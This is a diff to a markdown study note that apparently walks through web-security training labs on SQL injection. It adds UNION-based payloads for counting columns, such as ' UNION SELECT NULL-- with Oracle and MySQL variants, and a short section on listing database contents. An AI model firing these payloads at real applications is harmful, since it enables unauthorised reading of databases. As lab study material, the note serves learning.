@@ -12,6 +12,18 @@ Injection points to consider:
 - cookie values
 - url parameters
 
+UNION Methodology
+
+```
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+Oracle:
+' UNION SELECT NULL FROM DUAL--
+MySQl or Microsoft
+' UNION SELECT NULL#
+```
+
+
 ## Labs walkthrough sections
 
 ### SQLi vulnerability in WHERE clause allowing retrieval of hidden data
@@ -77,8 +89,14 @@ To solve just add @@version to the columns above
 ' UNION SELECT NULL,NULL#
 ```
 
+### SQL injection attack, listing the database contents on non-Oracle databases
 
+Follow the same UNION strategy as above
 
+```
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+```
 
 
 
